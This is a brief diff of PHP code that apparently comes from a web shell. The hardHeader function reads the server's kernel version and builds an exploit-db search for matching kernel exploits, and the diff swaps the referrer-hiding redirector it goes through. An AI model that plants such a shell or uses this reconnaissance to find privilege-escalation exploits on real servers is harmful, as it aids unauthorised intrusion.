@@ -188,7 +188,7 @@ function hardHeader() {
 	$totalSpace = $totalSpace?$totalSpace:1;
 	$release = @php_uname('r');
 	$kernel = @php_uname('s');
-	$explink = 'https://anon.click/protected/https://www.exploit-db.com/search/?action=search&description=';
+	$explink = 'http://no-referer.de/https://www.exploit-db.com/search/?action=search&description=';
 	if(strpos('Linux', $kernel) !== false)
 		$explink .= urlencode('Linux Kernel ' . substr($release,0,6));
 	else
